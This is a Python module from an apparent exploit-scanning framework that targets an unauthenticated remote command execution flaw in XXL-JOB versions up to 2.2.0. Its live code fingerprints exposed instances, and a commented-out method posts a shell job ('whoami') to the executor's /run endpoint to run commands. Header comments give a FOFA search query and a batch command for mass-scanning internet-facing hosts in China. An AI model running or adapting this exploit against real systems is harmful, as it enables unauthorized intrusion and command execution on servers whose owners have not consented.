# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *

import time

# fofa: app="XXL-JOB" && country="CN"
# python3 batch.py -m exploit.scripts.XXLJob.unauth_rce -cs -fs "app=\"XXL-JOB\" && country=\"CN\""


class Script(BaseScript):
    name = 'xxl job'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/favicon.ico']
        # exec
        self.exec_path_list = ['/run']
        # 相关信息
        self.info = '''xxl-job未授权加命令执行漏洞支持 =<v2.2.0版本 支持脚本语言有Shell、Python、NodeJS、PHP、PowerShell
        # windows推荐使用PowerShell,Linux推荐使用shell
        # 如果不行可尝试其它方式，前提是环境支持
        '''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '分布式任务调度平台XXL-JOB' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
    # async def exec(self):
    #     headers = self.headers.copy()
    #     headers.update({'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip, deflate'})
    #     async with aiohttp.ClientSession() as session:
    #         for exec_path in self.exec_path_list:
    #             url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
    #             times = round(time.time() * 1000)
    #             data = '''{
    #               "jobId": 1, "executorHandler": "demoJobHandler", "executorParams": "demoJobHandler",
    #               "executorBlockStrategy": "COVER_EARLY", "executorTimeout": 0,
    #               "logId": 1, "logDateTime": 1586629003729, "glueType": "GLUE_SHELL",
    #               "glueSource": "whoami", "glueUpdatetime":''' + str(times) + ''',
    #               "broadcastIndex": 0, "broadcastTotal": 0
    #             }'''
    #             text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, time=self.req_timeout)
    #             if text is not None:
    #                 gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
    #                 return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
